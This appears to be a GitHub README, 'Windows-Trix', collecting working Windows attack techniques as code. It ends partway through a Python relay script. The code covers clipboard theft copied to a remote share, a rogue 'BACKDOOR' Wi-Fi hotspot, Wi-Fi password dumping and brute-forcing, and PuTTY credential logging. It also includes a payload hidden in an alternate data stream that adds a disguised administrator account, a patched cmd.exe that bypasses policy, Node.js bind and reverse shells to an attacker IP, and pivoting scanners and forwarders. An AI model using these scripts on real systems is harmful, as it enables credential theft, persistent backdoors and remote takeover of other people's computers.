# Windows-Trix
An assortment of techniques that can be used to exploit Windows.  These are uncommon exploits that are not often used.  Most of these assume that you have or can attain administrator or system privileges on the endpoint.  You will need to change IP addresses and other references in the examples to fit your environment.

## >> Copying data from the clipboard using powershell

```powershell
Add-Type -AssemblyName System.Windows.Forms

if($([System.Windows.Forms.Clipboard]::ContainsImage())) {
   $cb = [System.Windows.Forms.Clipboard]::GetImage()
   $file = '\\10.1.2.3\upload\clipboard.png'
   $cb.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
} elseif($([System.Windows.Forms.Clipboard]::ContainsText())) {
   $cb = [System.Windows.Forms.Clipboard]::GetText()
   $file = '\\10.1.2.3\upload\clipboard.txt'
   $cb > $file
} else {
   Write-Output "Nothing in clipboard to save."
}
```

## >> Configuring a backdoor hotspot using powershell

**Activation script** `wifi-start.ps1`<br />
```powershell
regsvr32 /s hnetcfg.dll
sc start SharedAccess | Out-Null

$ssid = "BACKDOOR"
$wpsk = "1234567890"

$hsup = netsh wlan show drivers | Select-String "Hosted network supported" | Select-String "Yes"
if(!$hsup)
{
   Write-Host "Wireless host mode not supported."
   Exit
}
$huse = netsh wlan show interfaces | Select-String "Hosted network status" | Select-String ": Started"
if($huse)
{
   Write-Host "Wireless host mode already in use."
   Exit
}
$wuse = netsh wlan show interfaces | Select-String "State" | Select-String "disconnected"
if(!$wuse)
{
   Write-Host "Wireless interface already in use."
   Exit
}
$ename = Get-NetAdapter | Where-Object {$_.PhysicalMediaType -eq '802.3' -and $_.MediaConnectionState -eq 'Connected'} | Select-Object -Property Name
if($ename.Name -eq $null)
{
   Write-Host "Connected ethernet interface name not identified."
   Exit
}
$enet_name = $ename.Name
$eipa = Get-NetIPAddress -InterfaceAlias $enet_name | Select-Object -Property IPAddress
if($eipa.IPAddress -eq $null)
{
   Write-Host "Ethernet interface IP Address not identified."
   Exit
}
$hcfg = netsh wlan set hostednetwork mode=allow ssid="$ssid" key="$wpsk" | Select-String "successfully changed"
if(!$hcfg)
{
   Write-Host "Wireless host mode could not be configured."
   Exit
}
$hact = netsh wlan start hostednetwork | Select-String "hosted network started"
if(!$hact)
{
   Write-Host "Wireless host mode could not be activated."
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$wname = Get-NetAdapter | Where-Object {($_.PhysicalMediaType -eq 'Native 802.11' -or $_.PhysicalMediaType -eq 'Wireless LAN') -and $_.Status -eq 'Up' -and $_.AdminStatus -eq 'Up' -and $_.ifDesc -like 'Microsoft Hosted Network Virtual Adapter*'} | Select-Object -Property Name
if($wname.Name -eq $null)
{
   Write-Host "Wireless host mode interface name could not be identified."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$wlan_name = $wname.Name
$nso = New-Object -ComObject HNetCfg.HNetShare
if($nso -eq $null)
{
   Write-Host "Failed to create NetShare object."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$netpub = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$enet_name" }
$cfgpub = $nso.INetSharingConfigurationForINetConnection.Invoke($netpub)
if($cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS ethernet interface already in use."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$netpri = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$wlan_name" }
$cfgpri = $nso.INetSharingConfigurationForINetConnection.Invoke($netpri)
if($cfgpri.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless interface already in use."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$cfgpri.EnableSharing(1)
$cfgpub.EnableSharing(0)
if($cfgpri.SharingEnabled -eq $true -and $cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless hotspot configured successfully."
   Exit
}
else
{
   Write-Host "ICS wireless hotspot setup failed."
   $cfgpri.DisableSharing()
   $cfgpub.DisableSharing()
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
```

If you get error `Exception from HRESULT: 0x80040201` from the `EnableSharing` method then run the following VB script to delete all interface ICS configurations and try the `wifi-start.ps1` script again.<br />
```
set WMI = GetObject("WinMgmts:\root\Microsoft\HomeNet")
set objs1 = WMI.ExecQuery("SELECT * FROM HNet_ConnectionProperties WHERE IsIcsPrivate = TRUE")
for each obj in objs1
   obj.IsIcsPrivate = FALSE
   obj.Put_
next
set objs2 = WMI.ExecQuery("SELECT * FROM HNet_ConnectionProperties WHERE IsIcsPublic = TRUE")
for each obj in objs2
   obj.IsIcsPublic = FALSE
   obj.Put_
next
```

**Deactivation script** `wifi-stop.ps1`<br />
```powershell
regsvr32 /s hnetcfg.dll

$ssid = "BACKDOOR"

$huse = netsh wlan show interfaces | Select-String "Hosted network status" | Select-String "Started"
if(!$huse)
{
   Write-Host "Wireless host mode not in use."
   Exit
}
$ename = Get-NetAdapter | Where-Object {$_.PhysicalMediaType -eq '802.3' -and $_.MediaConnectionState -eq  'Connected'} | Select-Object -Property Name
if($ename.Name -eq $null)
{
   Write-Host "Connected ethernet interface name not identified."
   Exit
}
$enet_name = $ename.Name
$eipa = Get-NetIPAddress -InterfaceAlias $enet_name | Select-Object -Property IPAddress
if($eipa.IPAddress -eq $null)
{
   Write-Host "Ethernet interface IP Address not identified."
   Exit
}
$wname = Get-NetAdapter | Where-Object {($_.PhysicalMediaType -eq 'Native 802.11' -or $_.PhysicalMediaType -eq 'Wireless LAN') -and $_.Status -eq 'Up' -and $_.AdminStatus -eq 'Up' -and $_.ifDesc -like 'Microsoft Hosted Network Virtual Adapter*'} | Select-Object -Property Name
if($wname.Name -eq $null)
{
   Write-Host "Wireless host mode interface name could not be identified."
   Exit
}
$wlan_name = $wname.Name
$nso = New-Object -ComObject HNetCfg.HNetShare
if($nso -eq $null)
{
   Write-Host "Failed to create NetShare object."
   Exit
}
$netpub = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$enet_name" }
$cfgpub = $nso.INetSharingConfigurationForINetConnection.Invoke($netpub)
$netpri = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$wlan_name" }
$cfgpri = $nso.INetSharingConfigurationForINetConnection.Invoke($netpri)
if($cfgpri.SharingEnabled -eq $true -and $cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless hotspot deactivated."
   $cfgpri.DisableSharing()
   $cfgpub.DisableSharing()
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
else
{
   Write-Host "Active ICS hotspot not detected."
   Exit
}
```

## >> Retrieving wireless profile passwords using powershell

```powershell
$wp = @()
(((netsh wlan show profiles) | out-string ).split("`r`n")).ForEach({
   if($_ -Like '*All user profile*')
   {
      $t = $_.Split(":")
      $wp += $t[1].trim()
   }
})
Write-Host "SSID -> PSK"
Write-Host "-----------------------------------------"
$wp.foreach({
   $id = $_
   (((netsh wlan show profile "$id" key=clear) | Out-String).Split("`r`n")).ForEach({
   if($_ -Like '*Key content*')
   {
      $pw = ($_.Split(":"))[1].trim()
      Write-Host "$id -> $pw"
   }
})})
```

## >> View wireless networks and signal strength using netsh

```netsh wlan show networks mode=bssid```

## >> Slow on-line brute-force wireless password using powershell

```powershell
$ssid = "iPhone"
$wordlist = @("password",
              "secretkey!",
              "wifiaccess",
              "wifipassword",
              "1234567890",
              "Pa55w0rd")
$xmlfile = "C:\windows\temp\BruteForce.xml"
$pxml = @'
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
   <name>BruteForce</name>
   <SSIDConfig>
      <SSID>
         <hex>------</hex>
         <name>------</name>
      </SSID>
   </SSIDConfig>
   <connectionType>ESS</connectionType>
   <connectionMode>auto</connectionMode>
   <MSM>
      <security>
         <authEncryption>
            <authentication>WPA2PSK</authentication>
            <encryption>AES</encryption>
            <useOneX>false</useOneX>
         </authEncryption>
         <sharedKey>
            <keyType>passPhrase</keyType>
            <protected>false</protected>
            <keyMaterial>------</keyMaterial>
         </sharedKey>
      </security>
   </MSM>
</WLANProfile>
'@
$ssidhex = ""
$ssid.ToCharArray() | foreach-object -process {$ssidhex += '{0:X}' -f [int][char]$_}
(((netsh wlan show interfaces) | out-string ).split("`r`n")).ForEach({
   if($_ -Like '*Name*')
   {
      $t = $_.Split(":")
      $wlan = $t[1].trim()
   }
})
if($wlan -eq $null)
{
   Write-Host "Could not identify the wireless adapter."
   Exit
}
foreach($key in $wordlist)
{
   if(Test-Path $xmlfile) {Remove-Item -Path "$xmlfile" -Force}
   ForEach($line in $($pxml -split "`r`n"))
   {
      $line = $line -Replace [regex]::Escape("<hex>------</hex>"),"<hex>$ssidhex</hex>"
      $line = $line -Replace [regex]::Escape("<name>------</name>"),"<name>$ssid</name>"
      $line = $line -Replace [regex]::Escape("<keyMaterial>------</keyMaterial>"),"<keyMaterial>$key</keyMaterial>"
      $line | Out-File "$xmlfile"
   }
   netsh wlan add profile filename="$xmlfile" | Out-Null
   netsh wlan connect name="BruteForce" interface="$wlan" | Out-Null
   Start-Sleep -s 4
   $state = ""
   (((netsh wlan show interfaces interface="$wlan") | out-string ).split("`r`n")).ForEach({
      if($_ -Like '*State*')
      {
         $t = $_.Split(":")
         $state = $t[1].trim()
      }
   })
   if($state -eq "connected")
   {
      Write-Host "Wireless PSK -> $key"
      netsh wlan delete profile name="BruteForce" | Out-Null
      Exit
   }
   netsh wlan delete profile name="BruteForce" | Out-Null
}
```

## >> Logging PuTTY credentials using powershell

```powershell
$user = Get-WMIObject -class Win32_ComputerSystem | select -ExpandProperty username
if(!$user)
{
   Write-Host "Currently logged on user not identified."
   Exit
}
Write-Host "Currently logged on user = $user"
$sidu = (New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).value
if(!$sidu)
{
   Write-Host "User SID not identified."
   Exit
}
$putty = Test-Path -Path "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if($putty -eq $False)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$sess = Get-ChildItem "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if(!$sess)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$skey = $sess | Foreach-Object {Get-ItemProperty $_.PsPath}
$snum = 0
Foreach($item in $skey)
{
   $rkey = Convert-Path $item.PsPath
   $rkey = "REGISTRY::$rkey"
   New-ItemProperty -Path "$rkey" -Name "LogFileName" -Value "C:\Windows\Temp\puttylog$snum.log" -Type String -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFlush" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogType" -Value 3 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFileClash" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitData" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitPasswords" -Value 0 -Type DWord -Force | Out-Null
   <# to remove logging
   New-ItemProperty -Path "$rkey" -Name "LogFileName" -Value "" -Type String -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFlush" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogType" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFileClash" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitData" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitPasswords" -Value 1 -Type DWord -Force | Out-Null
   #>
   $snum++
}
if($snum -gt 0)
{
   Write-Host "$snum PuTTY session(s) were configured to log credentials."
}
else
{
   Write-Host "There were no PuTTY sessions to configure."
}
```

**Listing PuTTY log paths**<br />
```powershell
$user = Get-WMIObject -class Win32_ComputerSystem | select -ExpandProperty username
if(!$user)
{
   Write-Host "Currently logged on user not identified."
   Exit
}
Write-Host "Currently logged on user = $user"
$sidu = (New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).value
if(!$sidu)
{
   Write-Host "User SID not identified."
   Exit
}
$putty = Test-Path -Path "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if($putty -eq $False)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$sess = Get-ChildItem "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if(!$sess)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$skey = $sess | Foreach-Object {Get-ItemProperty $_.PsPath}
$snum = 0
Foreach($item in $skey)
{
   $rkey = Convert-Path $item.PsPath
   $rkey = "REGISTRY::$rkey"
   $ppath = Get-ItemProperty -Path "$rkey" -Name "LogFileName"
   if($ppath)
   {
      $ppath.LogFileName
   }
   $snum++
}
if($snum -gt 0)
{
   Write-Host "$snum PuTTY session(s) have a log path."
}
else
{
   Write-Host "No PuTTY logging identified."
}
```

## >> Hiding payloads in Alternate Data Streams (ADS)

**Create a container file on an NTFS file system**<br />
`echo This is a harmless text file :) > c:\windows\temp\harmless.txt`

**Verify the contents of the container file**<br />
`type c:\windows\temp\harmless.txt`<br />
(output) `This is a harmless text file :)`

**Check the file size of the container file**<br />
`dir c:\windows\temp\harmless.txt`<br />
(output) `1 File(s) 34 bytes`

**Create powershell payload as base64 to add a backdoor account**<br />
Run `cat | base64 -w 0; echo` then paste the following code, press ctrl-d (EOF) when finished.<br />
```powershell
$Password = ConvertTo-SecureString "+BackD00rAdmin+" -AsPlainText -Force
New-LocalUser -Name "BDAdmin" -Password $Password -AccountNeverExpires -FullName "BD Admin" -Description "Helpdesk account, do not delete" -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member "BDAdmin"
```

**Create the hidden payload data stream using the base64 output above**<br />
`echo JFBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAiK0JhY2tEMDByQWRtaW4rIiAtQXNQbGFpblRleHQgLUZvcmNlCk5ldy1Mb2NhbFVzZXIgLU5hbWUgIkJEQWRtaW4iIC1QYXNzd29yZCAkUGFzc3dvcmQgLUFjY291bnROZXZlckV4cGlyZXMgLUZ1bGxOYW1lICJCRCBBZG1pbiIgLURlc2NyaXB0aW9uICJIZWxwZGVzayBhY2NvdW50LCBkbyBub3QgZGVsZXRlIiAtUGFzc3dvcmROZXZlckV4cGlyZXMKQWRkLUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwICJBZG1pbmlzdHJhdG9ycyIgLU1lbWJlciAiQkRBZG1pbiIK > c:\windows\temp\harmless.txt:payload.ps1`

**Verify the size and contents of** `harmless.txt` **have not changed**<br />
`dir c:\windows\temp\harmless.txt`<br />
(output) `1 File(s) 34 bytes`<br />
`type c:\windows\temp\harmless.txt`<br />
(output) `This is a harmless text file :)`

**Detonate the hidden payload to create the backdoor account**<br />
```powershell
powershell -command " &{[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-Content c:\windows\temp\harmless.txt -Stream payload.ps1 -Raw))) | Invoke-Expression}"
```

## >> TCP port scanning using certutil

This technique can be used when pivoting.  The error code indicates the status of the remote service.<br />
The target being scanned in this example is 10.1.2.3 port 8080.

`certutil -urlcache -split -f http://10.1.2.3:8080/doesnotexist.file doesnotexist.file | findstr FAILED`<br />
Response `0x80072f78` the port responded but is not HTTP protocol.<br />
Response `0x80190194` the port responded to HTTP but `doesnotexist.file` is not present (404 error).<br />
Response `0x80072efd` the port did not respond.<br />
Response does not contain an error code, then the file was retrieved successfully.

## >> TCP port scanning using powershell

**Port sweep single host**<br />
```powershell
$TcpPorts = 21,22,23,25,80,81,110,111,135,139,143,389,443,445,465,513,514,515,587,636,993,995,1080,1433,3128,3306,3389,4786,5800,5900,8080,8081,8088,8443,8888,10000
$IpAddress = "192.168.1.19"
$MsTimeout = 100

foreach($Port in $TcpPorts)
{
   $Socket = New-Object Net.Sockets.TcpClient
   $Socket.SendTimeout = 100
   $ErrorActionPreference = 'SilentlyContinue'
   $AsyncResult = $Socket.BeginConnect($IpAddress, $Port, $null, $null)
   Start-Sleep -milli $MsTimeout
   if($Socket.Connected)
   {
      Write-Output "$IpAddress port $Port is open"
   }
   else
   {
       # handle closed status here
   }
   $Socket.Close()
   $Socket = $null
}
```

**Host sweep single port**<br />
```powershell
$TcpPort = 445
$IpNet = "10.100.120"
$MsTimeout = 100

for($IpHost = 1; $IpHost -lt 256; $IpHost++)
{
   $IpAddress = "$IpNet.$IpHost"
   $Socket = New-Object Net.Sockets.TcpClient
   $Socket.SendTimeout = 100
   $ErrorActionPreference = 'SilentlyContinue'
   $AsyncResult = $Socket.BeginConnect($IpAddress, $TcpPort, $null, $null)
   Start-Sleep -milli $MsTimeout
   if($Socket.Connected)
   {
      Write-Output "$IpAddress port $TcpPort is open"
   }
   else
   {
       # handle closed status here
   }
   $Socket.Close()
   $Socket = $null
}
```

## >> Using netsh to capture network packets

This technique is useful for capturing insecure protocol traffic on a host (e.g. telnet, FTP, HTTP, SNMP).<br />
This example will filter the trace on IP address 10.2.5.92 and halt after 10MB is captured.

**Stop any currently running captures**<br />
`netsh trace stop`

**Start the packet capture**<br />
`netsh trace start capture=yes ipv4.address=10.2.5.92 filemode=single maxsize=10 overwrite=yes tracefile=c:\Windows\temp\tracefile.etl`

**Manually stop if necessary**<br />
`netsh trace stop`

**Convert the etl file to cap format for wireshark**<br />
Download Microsoft Network Monitor 3.4 from [HERE](https://www.microsoft.com/en-us/download/details.aspx?id=4865).<br />
Open `tracefile.etl` with Network Monitor 3.4 and save as `tracefile.cap`.<br />
Open `tracefile.cap` using wireshark.

## >> Performing SNMP from powershell

The Windows ISNMP Automation Interface can be used to perform GET and SET operations.  Cisco 3750 OID used in this example.

```powershell
# Get the system description
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.1.1.0')
$objSNMP.Close()
```

```powershell
# Get an interface description (Ge2/0/24)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.2.2.1.2.10624')
$objSNMP.Close()
```

```powershell
# Get an interface VLAN assignment (Ge2/0/24)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.4.1.9.9.68.1.2.2.1.2.10624')
$objSNMP.Close()
```

```powershell
# Get an interface link status (Ge2/0/24, 1 = up, 2 = down)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.2.2.1.8.10624')
$objSNMP.Close()
```

```powershell
# Change an interface VLAN assignment (Ge2/0/24, to VLAN 315)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Set('.1.3.6.1.4.1.9.9.68.1.2.2.1.2.10624', 315)
$objSNMP.Close()
```

## >> Circumventing cmd.exe policy restrictions

Windows group policy can be configured to disable execution of the command prompt by setting an option under Computer Policy >> User Configuration >> Administrative Templates >> System.  This results in the following message being displayed when attempting to launch the command prompt.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd02.png)

The cmd.exe program tests for the following registry value to determine if this policy is set:<br />
`HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD`

The unicode string for the registry value exists in the cmd.exe binary.  You can make a copy of cmd.exe and edit this string to defeat policy checking.  Here is an example of generating the hex characters to search for.

`echo DisableCMD | iconv -t utf-16le | hexdump -Cv`<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd00.png)

Using certutil.exe you can make a copy of cmd.exe represented as a text file containing hex characters.<br />
`c:\windows\system32\certutil.exe -encodehex c:\windows\system32\cmd.exe c:\users\xxxxxxxx\appdata\local\temp\cmd.txt`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd03.png)

Now edit the text file using notepad.<br />
`c:\windows\system32\notepad.exe c:\users\xxxxxxxx\appdata\local\temp\cmd.txt`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd04.png)

Find the hex characters that make up the unicode string generated earlier.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd05.png)<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd06.png)

Edit the hex values from `44 00 69 00` to `44 00 00 00` and save the text file.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd07.png)

Convert the text file back into an exe.<br />
`c:\windows\system32\certutil.exe -decodehex c:\windows\xxxxxxxx\appdata\local\temp\cmd.txt c:\windows\xxxxxxxx\appdata\local\temp\cmd.exe`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd08.png)

Double-click on the modified copy of cmd.exe.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd09.png)

You now have a command shell.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd10.png)

## >> Node.js bind and reverse shell using node.exe

The Node.js JavaScript runtime is occasionally found on a Windows system either as a standalone installation or bundled in with some other application (e.g. Adobe Creative Cloud).  You can also extract the node.exe binary from the [ZIP package](https://nodejs.org/en/download/ "Node.js Download") and copy it to a victim computer.

Example of a bind shell (socket server)<br />
```javascript
// Example command execution with authentication.
// (1) Save this script as "server.js"
// (2) Launch the bind shell on the victim "node.exe server.js"
// (3) Connect from the attacking computer "nc <victim IP> 4444"
// command: ug0tpwn3d, allows the server to start processing commands.
// command: DISCONNECT, drops current connection, must reauth with key on new client connect.
// command: ABORT, terminates the script.

var net = require('net');
var spawn = require('child_process').spawn;
var c2host = '0.0.0.0';
var c2port = 4444;
var state = 'DISABLED';
var authkey = 'ug0tpwn3d';

var server = net.createServer(function(socket)
{
   socket.write('Ready...\r\n');
   socket.on('data', function(directive)
   {
      if(directive.toString().trim() === authkey && state === 'DISABLED')
      {
         // authn success, start processing commands
         state = 'ENABLED';
         socket.write('Authentication successful.  Accepting commands...\r\n');
      }
      else if(directive.toString().trim() === 'DISCONNECT' && state === 'ENABLED')
      {
         // drop current connection and disable command processor
         socket.destroy();
         state = 'DISABLED';
      }
      else if(directive.toString().trim() === 'ABORT' && state === 'ENABLED')
      {
         // terminate the script
         socket.destroy();
         process.exit(1);
      }
      else if(state === 'ENABLED')
      {
         // execute a command
         cmd = spawn(process.env.comspec, ['/c', directive.toString().trim()], {windowsVerbatimArguments: true});
         cmd.stdout.on('data', function(output)
         {
            socket.write(output.toString());
         });
         cmd.stderr.on('data', function(output)
         {
            socket.write(output.toString());
         });
      }
   });
}).listen(c2port, c2host);
```

Example of a reverse shell (socket client)<br />
```javascript
// Example command execution.
// (1) Save this script as "client.js"
// (2) Start a netcat listener on the attacking computer "nc -nlvp 4444"
// (3) Launch the reverse shell on the victim "node.exe client.js"
// command: ABORT, terminates the script.

var net = require('net');
var spawn = require('child_process').spawn;
var c2host = '192.168.1.119';
var c2port = 4444;

var client = new net.Socket();
client.connect(c2port, c2host, function()
{
   client.write('Ready...\r\n');
});
client.on('data', function(directive)
{
   if(directive.toString().trim() === 'ABORT')
   {
      // terminate the script
      client.destroy();
      process.exit(1);
   }
   else
   {
      // execute a command
      cmd = spawn(process.env.comspec, ['/c', directive.toString().trim()], {windowsVerbatimArguments: true});
      cmd.stdout.on('data', function(output)
      {
         client.write(output.toString());
      });
      cmd.stderr.on('data', function(output)
      {
         client.write(output.toString());
      });
   }
});
```

## >> TCP port forwarding with netsh

Forward TCP port 2222 to port 22 on remote host.

`netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=10.192.103.49`

Remove port forwarding rule.

`netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=0.0.0.0`

## >> TCP local port forwarding with powershell

Local port forwarder using a bind socket.  Example listens on port 2222 and forwards to remote host 192.168.1.19 port 22.

```powershell
# Target parameters
$tcpRHost = "192.168.1.19"
$tcpRPort = "22"

# Bind parameters
$tcpLAddr = "0.0.0.0"
$tcpLPort = "2222"

try {
   $TcpServer = New-Object System.Net.Sockets.TcpListener([system.net.IPAddress]::Parse($tcpLAddr), $tcpLPort)
}
catch {
   Write-Output "Failed to listen on $tcpLAddr port $tcpLPort"
   exit
}

try {
   $TcpServer.Start()
}
catch {
   Write-Output "Failed to start server on $tcpLAddr port $tcpLPort"
   $tcpServer.Stop()
   exit
}

$tcpConnection = $tcpServer.AcceptTcpClient()
$RemoteIP = $tcpConnection.Client.RemoteEndPoint.Address.IPAddressToString
Write-Output "Received connection from $RemoteIP"
if($tcpConnection -ne $null)
{
   $tcpServer.Stop()
   try {
      $tcpClient = New-Object System.Net.Sockets.TcpClient($tcpRHost, $tcpRPort)
   }
   catch {
      Write-Output "Failed to connect to $tcpRHost port $tcpRPort"
      exit
   }
}
else
{
   Write-Output "Accept error"
   $tcpServer.Stop()
   exit
}

$LStream = $tcpConnection.GetStream()
$RStream = $tcpClient.GetStream()

$LBuffer = New-Object Byte[] $tcpConnection.ReceiveBufferSize
$RBuffer = New-Object Byte[] $tcpClient.ReceiveBufferSize

$idle = 0

while($true) {
   if($tcpConnection.Connected -and $tcpClient.Connected)
   {
      if(($tcpConnection.Client.Available -gt 0) -or ($tcpClient.Client.Available -gt 0))
      {
         if($tcpConnection.Client.Available -gt 0)
         {
            $LRead = $LStream.Read($LBuffer, 0, $LBuffer.Length)
            $RStream.Write($LBuffer, 0, $LRead)
            $idle = 0
         }
         if($tcpClient.Client.Available -gt 0)
         {
            $RRead = $RStream.Read($RBuffer, 0, $RBuffer.Length)
            $LStream.Write($RBuffer, 0, $RRead)
            $idle = 0
         }
      }
      else
      {
         Start-Sleep -Milliseconds 10
         $idle++
         if($idle -gt 3000)
         {
            # approx 30 sec idle close
            $tcpConnection.Close()
            $tcpClient.Close()
         }
      }
   }
   else
   {
      Write-Output "Connection closed"
      exit
   }
}
```

## >> TCP remote port forwarding with powershell

Remote port forwarder on attacking host relays through Windows host running a powershell port forwarder.  Example attacking Linux host runs a python script that proxies a local application through a connection received from the Windows host.  The Windows host then forwards the traffic to another remote host.  This example shows how to run a python script on attacking host 192.168.1.19 that forwards SSH to port 2222 through a connection initiated from a Windows host to the attacking machine on tunnel port 4444.  The Windows host then forwards the SSH traffic to remote host 192.168.100.109 port 22.

Python script `apprelay.py`<br />
```python
#!/usr/bin/python

import socket
import sys
import struct
from time import sleep
import select as socksel

t_port = 4444
a_port = 2222
t_host = '0.0.0.0'
a_host = 'localhost'

t_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

t_addr = (t_host, t_port)
a_addr = (a_host, a_port)

t_socket.bind(t_addr)
a_socket.bind(a_addr)

t_socket.listen(1)
